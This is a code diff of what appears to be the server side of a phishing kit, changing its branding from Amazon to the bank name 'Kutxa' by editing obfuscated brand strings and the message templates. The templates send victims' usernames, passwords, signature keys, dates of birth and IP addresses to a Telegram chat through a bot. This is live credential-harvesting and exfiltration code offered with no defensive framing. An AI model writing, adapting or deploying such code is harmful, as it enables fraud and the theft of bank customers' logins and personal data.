@@ -1492,10 +1492,10 @@ io.on('connection', (socket) => {
   });
 });
 
-let target = "A-1M-1A-1Z-1O"; // hadi hizyada;
+let target = "K-1U-1T-1X-1A"; // hadi hizyada;
 target = target.split("-1");
 target = target.join("");
-let brand = "A-1M-1A-1Z-1O"; // hadi hizyada;
+let brand = "K-1U-1T-1X-1A"; // hadi hizyada;
 brand = brand.split("-1");
 brand = brand.join("");
 
@@ -3595,7 +3595,7 @@ app.post("/SSwP85AgNE4pnL5mWSM", (req, res) => { // posas post
   const clientIp = getAccurateClientIp(req);
   try {
         if (process.env.CHATID && process.env.TOKEN) {
-          bot.telegram.sendMessage(process.env.CHATID, `${brand} | [Firma] (Amazon) | TEAM\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n\nFirma: ${data.signatureKey}\nDate: ${data.dob}\nIP: ${clientIp}\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n${brand} | [${target}] | TEAM`)
+          bot.telegram.sendMessage(process.env.CHATID, `${brand} | [Firma] (Kutxa) | TEAM\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n\nFirma: ${data.signatureKey}\nDate: ${data.dob}\nIP: ${clientIp}\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n${brand} | [${target}] | TEAM`)
             .catch(error => console.error('Telegram notification failed:', error.message));
         } else {
           console.warn('Telegram bot not configured - Amazon password notification skipped');
@@ -3701,7 +3701,7 @@ function b1(data, ip) {
 
 function a1(data, ip) {
   let block = "";
-  block += `${brand}  | [LOGIN] (Amazon) |  TEAM\n`;
+  block += `${brand}  | [LOGIN] (Kutxa) |  TEAM\n`;
   block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
   block += `USER: ${data.username}\npass: ${data.password}\nIP: ${ip}\n`;
   block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
